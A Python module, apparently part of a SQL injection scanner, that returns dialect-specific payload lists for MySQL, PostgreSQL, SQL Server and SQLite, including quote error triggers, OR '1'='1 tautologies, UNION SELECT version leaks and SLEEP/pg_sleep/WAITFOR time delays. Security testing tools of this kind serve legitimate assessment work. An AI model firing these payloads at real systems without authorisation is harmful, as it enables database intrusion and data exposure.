"""
SQLi Dialect-Specific Payload Pools

Provides ordered payload lists for each SQL database dialect and a generic fallback.
"""

from dataclasses import dataclass
from typing import List, Optional

@dataclass
class PayloadSpec:
    name: str
    vector: str
    kind: str   # "error" | "boolean" | "time"
    note: str = ""

def get_generic_payloads() -> List[PayloadSpec]:
    """Generic SQLi payloads that work across most databases."""
    return [
        PayloadSpec("GEN_QUOTE_ERR", "'", "error", "generic quote to trigger error"),
        PayloadSpec("GEN_BOOL_T", "' OR '1'='1", "boolean", "generic boolean true"),
        PayloadSpec("GEN_BOOL_F", "' AND '1'='2", "boolean", "generic boolean false"),
    ]

def get_mysql_payloads() -> List[PayloadSpec]:
    """MySQL-specific SQLi payloads."""
    return [
        PayloadSpec("MYSQL_ERR_QUOTE", "'", "error", "force parse error"),
        PayloadSpec("MYSQL_VERSION", "' UNION SELECT @@version -- ", "error", "version leak"),
        PayloadSpec("MYSQL_BOOL_T", "' OR '1'='1 -- ", "boolean", ""),
        PayloadSpec("MYSQL_BOOL_F", "' AND '1'='2 -- ", "boolean", ""),
        PayloadSpec("MYSQL_TIME", "' AND SLEEP(2) -- ", "time", ""),
    ]

def get_postgres_payloads() -> List[PayloadSpec]:
    """PostgreSQL-specific SQLi payloads."""
    return [
        PayloadSpec("PG_ERR_QUOTE", "'", "error", ""),
        PayloadSpec("PG_VERSION", "' UNION SELECT current_setting('server_version') -- ", "error", ""),
        PayloadSpec("PG_BOOL_T", "' OR '1'='1 -- ", "boolean", ""),
        PayloadSpec("PG_BOOL_F", "' AND '1'='2 -- ", "boolean", ""),
        PayloadSpec("PG_TIME", "'; SELECT pg_sleep(2); -- ", "time", ""),
    ]

def get_mssql_payloads() -> List[PayloadSpec]:
    """Microsoft SQL Server-specific SQLi payloads."""
    return [
        PayloadSpec("MSSQL_ERR_QUOTE", "'", "error", ""),
        PayloadSpec("MSSQL_VERSION", "' UNION SELECT @@version -- ", "error", ""),
        PayloadSpec("MSSQL_BOOL_T", "' OR '1'='1 -- ", "boolean", ""),
        PayloadSpec("MSSQL_BOOL_F", "' AND '1'='2 -- ", "boolean", ""),
        PayloadSpec("MSSQL_TIME", "'; WAITFOR DELAY '0:0:2'; -- ", "time", ""),
    ]

def get_sqlite_payloads() -> List[PayloadSpec]:
    """SQLite-specific SQLi payloads."""
    return [
        PayloadSpec("SQLITE_ERR_QUOTE", "'", "error", ""),
        PayloadSpec("SQLITE_VERSION", "' UNION SELECT sqlite_version() -- ", "error", ""),
        PayloadSpec("SQLITE_BOOL_T", "' OR '1'='1 -- ", "boolean", ""),
        PayloadSpec("SQLITE_BOOL_F", "' AND '1'='2 -- ", "boolean", ""),
        # Time-based unreliable on SQLite; intentionally omitted
    ]

def sqli_payload_pool_for(dialect: Optional[str]) -> List[PayloadSpec]:
    """
    Get SQLi payload pool for specific dialect.
    
    Args:
        dialect: Database dialect ("mysql", "postgres", "mssql", "sqlite", or None)
        
    Returns:
        List of PayloadSpec objects for the dialect
    """
    if dialect == "mysql":
        return get_mysql_payloads()
    elif dialect == "postgres":
        return get_postgres_payloads()
    elif dialect == "mssql":
        return get_mssql_payloads()
    elif dialect == "sqlite":
        return get_sqlite_payloads()
    else:
        return get_generic_payloads()

def sqli_payload_strings_for(dialect: Optional[str]) -> List[str]:
    """
    Get SQLi payload strings for specific dialect.
    
    Args:
        dialect: Database dialect ("mysql", "postgres", "mssql", "sqlite", or None)
        
    Returns:
        List of payload strings for the dialect
    """
    payloads = sqli_payload_pool_for(dialect)
    return [p.vector for p in payloads]
